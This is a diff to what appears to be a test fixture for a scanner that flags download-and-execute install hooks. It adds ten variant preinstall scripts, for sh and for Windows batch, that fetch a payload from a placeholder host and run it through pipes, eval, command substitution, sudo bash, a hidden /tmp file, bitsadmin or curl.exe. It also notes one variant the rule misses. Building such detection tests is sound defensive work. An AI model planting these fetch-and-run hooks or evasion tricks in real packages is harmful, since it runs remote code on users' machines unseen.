@@ -42,3 +42,77 @@ must_fire:
   - {rule: RC-DLX-002, path: preinstall.bat}
   - {rule: RC-DLX-004, path: preinstall.sh}
 must_not_fire: [RC-BIN-001, RC-DEP-001]
+
+variants:
+  - id: variable-indirection
+    technique: The download is stored in a variable and run with `sh -c` (one line).
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        S=$(curl -s https://example.invalid/payload); sh -c "$S"
+  - id: variable-two-lines
+    technique: The download is stored in a variable on one line and run with `eval` on the next.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        STAGE="$(wget -qO- https://example.invalid/payload)"
+        eval "$STAGE"
+  - id: env-sh
+    technique: The download is piped into `env sh` instead of `sh`.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        curl -s https://example.invalid/payload | env sh
+  - id: sudo-bash
+    technique: The download is piped into `sudo bash`.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        curl -fsSL https://example.invalid/payload | sudo bash -s -- --quiet
+  - id: python-c-substitution
+    technique: Command substitution of the download passed to `python3 -c`.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        python3 -c "$(curl -s https://example.invalid/payload.py)"
+  - id: backticks
+    technique: Old-style backtick command substitution of the download passed to `bash -c`.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        bash -c "`curl -s https://example.invalid/payload`"
+  - id: line-continuation
+    technique: The pipe into the shell is on a continuation line.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        curl -s https://example.invalid/payload \
+          | sh
+  - id: temp-variable
+    technique: The temporary path is kept in a variable, so the start command does not name /tmp.
+    files:
+      preinstall.sh: |
+        #!/bin/sh
+        DROP=/tmp/.cache-update
+        curl -s https://example.invalid/payload -o "$DROP"
+        chmod +x "$DROP"
+        "$DROP"
+  - id: bitsadmin
+    technique: The Windows downloader is bitsadmin instead of certutil.
+    files:
+      preinstall.bat: |
+        @echo off
+        bitsadmin /transfer update /download /priority normal https://example.invalid/payload.exe %TEMP%\payload.exe
+        start "" %TEMP%\payload.exe
+  - id: curl-exe
+    technique: The Windows downloader is the curl.exe that ships with Windows.
+    files:
+      preinstall.bat: |
+        @echo off
+        curl.exe -s -o %TEMP%\payload.exe https://example.invalid/payload.exe
+        start "" %TEMP%\payload.exe
+known_gaps:
+  - variant: temp-variable
+    reason: >
+      RC-DLX-004 needs the temporary folder on the line that makes the file executable or
+      starts it; a path kept in a variable is not followed.
